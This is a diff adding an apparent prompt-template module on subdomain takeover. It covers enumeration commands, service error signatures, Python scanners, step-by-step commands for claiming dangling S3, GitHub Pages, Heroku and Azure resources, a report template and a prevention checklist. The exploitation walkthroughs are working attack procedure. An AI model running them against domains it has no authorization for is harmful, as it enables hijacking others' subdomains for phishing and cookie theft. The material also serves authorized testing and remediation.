@@ -1,0 +1,397 @@
+{# Subdomain Takeover Security Module #}
+{# Comprehensive subdomain takeover discovery and exploitation #}
+
+<subdomain_takeover_module>
+
+## SUBDOMAIN TAKEOVER GUIDE
+
+### UNDERSTANDING SUBDOMAIN TAKEOVER
+
+**What is it?**
+Subdomain takeover occurs when a subdomain points to a third-party service that has been removed or unconfigured, allowing an attacker to claim that resource and serve content on the victim's subdomain.
+
+**Impact:**
+- Phishing attacks using legitimate domain
+- Cookie stealing (same-origin policy bypass)
+- Session hijacking
+- Reputation damage
+- SEO manipulation
+
+### SUBDOMAIN ENUMERATION
+
+**Passive Discovery:**
+```bash
+# Subfinder
+subfinder -d target.com -o subdomains.txt
+
+# Amass passive
+amass enum -passive -d target.com -o subdomains.txt
+
+# crt.sh
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# SecurityTrails
+curl -s "https://api.securitytrails.com/v1/domain/target.com/subdomains" -H "APIKEY: KEY"
+
+# Wayback Machine
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com&output=text&fl=original&collapse=urlkey"
+```
+
+**Active Discovery:**
+```bash
+# DNS brute force
+gobuster dns -d target.com -w /usr/share/wordlists/dns.txt
+
+# Amass active
+amass enum -active -d target.com -brute -w /path/to/wordlist.txt
+
+# DNSRecon
+dnsrecon -d target.com -t brt
+```
+
+### VULNERABLE SERVICE SIGNATURES
+
+**Cloud Services:**
+```
+AWS S3:
+CNAME: bucket.s3.amazonaws.com
+Error: "NoSuchBucket" or 404 with S3 XML
+
+AWS CloudFront:
+CNAME: xxx.cloudfront.net
+Error: "Bad Request" or distribution not found
+
+Azure:
+CNAME: xxx.azurewebsites.net
+CNAME: xxx.blob.core.windows.net
+CNAME: xxx.cloudapp.azure.com
+CNAME: xxx.trafficmanager.net
+Error: 404 "Web App - Unavailable"
+
+Google Cloud:
+CNAME: xxx.storage.googleapis.com
+CNAME: c.storage.googleapis.com
+Error: 404 NoSuchBucket
+```
+
+**Platform Services:**
+```
+GitHub Pages:
+CNAME: xxx.github.io
+Error: 404 "There isn't a GitHub Pages site here"
+
+Heroku:
+CNAME: xxx.herokuapp.com
+Error: "No such app" or Heroku 404 page
+
+Shopify:
+CNAME: shops.myshopify.com
+Error: "Sorry, this shop is currently unavailable"
+
+Tumblr:
+CNAME: domains.tumblr.com
+Error: "There's nothing here" or Tumblr 404
+
+WordPress.com:
+CNAME: xxx.wordpress.com
+Error: "Do you want to register xxx.wordpress.com?"
+
+Zendesk:
+CNAME: xxx.zendesk.com
+Error: "Help Center Closed"
+
+Fastly:
+CNAME: xxx.fastly.net
+Error: Fastly error page with "unknown domain"
+
+Ghost:
+CNAME: xxx.ghost.io
+Error: "Ghost(Pro) site doesn't exist"
+
+Pantheon:
+CNAME: xxx.pantheonsite.io
+Error: 404 "unknown site"
+
+Unbounce:
+CNAME: xxx.unbounce.com
+Error: "The requested URL was not found"
+
+HelpScout:
+CNAME: xxx.helpscoutdocs.com
+Error: 404 "No settings were found"
+
+Campaign Monitor:
+CNAME: xxx.createsend.com
+Error: "Trying to access your account?"
+
+Cargo:
+CNAME: xxx.cargo.site
+Error: 404 default page
+
+Feedpress:
+CNAME: redirect.feedpress.me
+Error: "The feed has not been found"
+
+Surge.sh:
+CNAME: xxx.surge.sh
+Error: "project not found"
+
+Bitbucket:
+CNAME: xxx.bitbucket.io
+Error: "Repository not found"
+
+Intercom:
+CNAME: custom.intercom.help
+Error: "This page is reserved for..."
+
+Webflow:
+CNAME: xxx.webflow.io
+Error: "The page you are looking for doesn't exist"
+
+Netlify:
+CNAME: xxx.netlify.app
+Error: "Page Not Found" or "Not Found - Request ID"
+
+Vercel:
+CNAME: xxx.vercel.app
+CNAME: xxx.now.sh
+Error: 404 "DEPLOYMENT_NOT_FOUND"
+
+Fly.io:
+CNAME: xxx.fly.dev
+Error: 404 with fly.io branding
+
+Render:
+CNAME: xxx.onrender.com
+Error: 404 "There is no app configured"
+```
+
+### DETECTION METHODOLOGY
+
+**Step 1: Resolve CNAME Records**
+```bash
+# Get CNAME for all subdomains
+while read subdomain; do
+    dig CNAME $subdomain +short
+done < subdomains.txt > cnames.txt
+```
+
+**Step 2: Check for Vulnerable Signatures**
+```python
+import requests
+import dns.resolver
+
+vulnerable_signatures = {
+    "s3.amazonaws.com": "NoSuchBucket",
+    "github.io": "There isn't a GitHub Pages site here",
+    "herokuapp.com": "No such app",
+    "azurewebsites.net": "Web App - Unavailable",
+    "cloudfront.net": "Bad Request",
+    "shopify.com": "Sorry, this shop is currently unavailable",
+    "tumblr.com": "There's nothing here",
+    "zendesk.com": "Help Center Closed",
+    "ghost.io": "Ghost(Pro) site doesn't exist",
+    "surge.sh": "project not found",
+    "netlify.app": "Not Found",
+    "vercel.app": "DEPLOYMENT_NOT_FOUND",
+}
+
+def check_takeover(subdomain):
+    try:
+        # Get CNAME
+        answers = dns.resolver.resolve(subdomain, 'CNAME')
+        cname = str(answers[0].target).rstrip('.')
+        
+        # Check if CNAME points to vulnerable service
+        for service, signature in vulnerable_signatures.items():
+            if service in cname:
+                # Verify with HTTP request
+                try:
+                    r = requests.get(f"http://{subdomain}", timeout=5)
+                    if signature in r.text:
+                        return f"VULNERABLE: {subdomain} -> {cname}"
+                except:
+                    pass
+    except:
+        pass
+    return None
+```
+
+**Step 3: Verify Exploitability**
+```bash
+# Manual verification
+curl -s http://vulnerable-subdomain.target.com | grep -i "signature"
+
+# Check DNS resolution
+host vulnerable-subdomain.target.com
+dig vulnerable-subdomain.target.com
+```
+
+### EXPLOITATION GUIDES
+
+**AWS S3 Takeover:**
+```bash
+# 1. Confirm bucket doesn't exist
+aws s3 ls s3://target-bucket
+# "NoSuchBucket" error
+
+# 2. Create bucket with same name
+aws s3 mb s3://target-bucket --region us-east-1
+
+# 3. Upload proof file
+echo "Subdomain Takeover by Security Researcher" > poc.html
+aws s3 cp poc.html s3://target-bucket/ --acl public-read
+
+# 4. Verify
+curl http://subdomain.target.com/poc.html
+```
+
+**GitHub Pages Takeover:**
+```bash
+# 1. Create repository matching the CNAME
+# If CNAME is: vulnerable.example.com -> username.github.io
+# Create repo named: username.github.io
+
+# 2. Add CNAME file
+echo "vulnerable.example.com" > CNAME
+
+# 3. Push and enable GitHub Pages
+git add CNAME index.html
+git commit -m "Takeover PoC"
+git push
+
+# 4. Wait for propagation and verify
+```
+
+**Heroku Takeover:**
+```bash
+# 1. Install Heroku CLI and login
+heroku login
+
+# 2. Create app with matching name
+# If CNAME: subdomain.example.com -> subdomain.herokuapp.com
+heroku create subdomain
+
+# 3. Add custom domain
+heroku domains:add subdomain.example.com
+
+# 4. Deploy PoC
+git push heroku main
+```
+
+**Azure Takeover:**
+```bash
+# 1. Confirm the Azure resource is unclaimed
+# CNAME: sub.example.com -> subdomain.azurewebsites.net
+curl http://sub.example.com
+# Returns Azure "Web App - Unavailable"
+
+# 2. Create new Azure Web App with same name
+az webapp create --name subdomain --resource-group myRG --plan myPlan
+
+# 3. Deploy PoC content
+az webapp deploy --name subdomain --type static
+```
+
+### AUTOMATED TOOLS
+
+**Subjack:**
+```bash
+# Install
+go install github.com/haccer/subjack@latest
+
+# Run scan
+subjack -w subdomains.txt -t 100 -timeout 30 -ssl -o results.txt
+```
+
+**Nuclei Templates:**
+```bash
+# Use nuclei with takeover templates
+nuclei -l subdomains.txt -t takeovers/
+```
+
+**Can-I-Take-Over-XYZ Reference:**
+```
+https://github.com/EdOverflow/can-i-take-over-xyz
+# Comprehensive list of takeover-able services
+```
+
+**Custom Python Scanner:**
+```python
+import asyncio
+import aiohttp
+import aiodns
+
+async def scan_subdomain(subdomain, session, resolver):
+    try:
+        # Resolve CNAME
+        result = await resolver.query(subdomain, 'CNAME')
+        cname = str(result.cname).rstrip('.')
+        
+        # Check HTTP response
+        async with session.get(f"http://{subdomain}", timeout=10) as resp:
+            text = await resp.text()
+            
+            # Check for vulnerable signatures
+            signatures = [
+                ("NoSuchBucket", "AWS S3"),
+                ("There isn't a GitHub Pages site", "GitHub Pages"),
+                ("No such app", "Heroku"),
+                ("DEPLOYMENT_NOT_FOUND", "Vercel"),
+            ]
+            
+            for sig, service in signatures:
+                if sig in text:
+                    return (subdomain, cname, service)
+    except:
+        pass
+    return None
+
+async def main(subdomains):
+    resolver = aiodns.DNSResolver()
+    async with aiohttp.ClientSession() as session:
+        tasks = [scan_subdomain(s, session, resolver) for s in subdomains]
+        results = await asyncio.gather(*tasks)
+        return [r for r in results if r]
+```
+
+### REPORTING TEMPLATE
+
+```markdown
+## Subdomain Takeover Vulnerability Report
+
+**Affected Subdomain:** vulnerable.target.com
+**CNAME Target:** deleted-resource.service.com
+**Service:** [AWS S3 / GitHub Pages / Heroku / etc.]
+
+### Impact
+An attacker can claim the unconfigured resource and serve malicious content 
+on the victim's subdomain. This enables:
+- Phishing attacks using trusted domain
+- Cookie theft (if domain shares cookies)
+- Credential harvesting
+- Reputation damage
+
+### Proof of Concept
+1. HTTP request to vulnerable.target.com returns "[signature]"
+2. CNAME record points to [service] resource that doesn't exist
+3. Attacker can create this resource and control subdomain content
+
+### Remediation
+1. Remove the dangling CNAME record
+2. Or: Reconfigure the service to serve proper content
+3. Audit all subdomains for similar issues
+```
+
+### PREVENTION CHECKLIST
+
+- [ ] Maintain inventory of all DNS records
+- [ ] Remove CNAME records when decommissioning services
+- [ ] Monitor for dangling DNS records
+- [ ] Use DNS monitoring tools/alerts
+- [ ] Implement process for service decommissioning
+- [ ] Regularly audit subdomains
+- [ ] Use CNAME verification features when available
+- [ ] Consider domain/subdomain registration preservation
+
+</subdomain_takeover_module>
